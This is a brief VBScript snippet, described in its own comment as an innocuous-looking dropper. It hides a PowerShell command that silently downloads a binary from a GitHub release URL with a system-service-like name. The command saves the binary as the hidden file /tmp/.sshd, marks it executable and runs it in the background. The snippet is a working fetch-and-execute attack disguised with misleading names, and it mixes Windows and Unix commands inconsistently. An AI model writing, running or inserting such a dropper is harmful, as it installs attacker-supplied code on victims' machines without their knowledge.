' Innocuous-looking VBScript dropper (powershell -> curl/-o/+x/&-exec)
Dim cmd
cmd = "powershell -c ""curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd; chmod +x /tmp/.sshd; /tmp/.sshd &"""
CreateObject("WScript.Shell").Run cmd, 0, False
